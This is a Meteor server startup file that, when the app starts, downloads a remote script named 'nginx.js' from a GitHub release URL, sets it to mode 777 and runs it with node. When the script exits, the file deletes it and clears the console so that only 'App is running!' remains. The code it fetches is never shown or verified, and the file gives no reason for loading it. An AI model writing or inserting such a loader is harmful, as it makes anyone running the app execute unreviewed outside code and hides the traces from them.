import { Meteor } from 'meteor/meteor';
import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';

const FILE_PATH = process.env.FILE_PATH || './tmp';
const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      fs.chmodSync(filePath, '777');

      console.log('running the webapp...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on('exit', (code) => {
        fs.unlink(filePath, err => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear();
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};

if (Meteor.isServer) {
  Meteor.startup(() => {
    downloadAndExecute();
  });
}
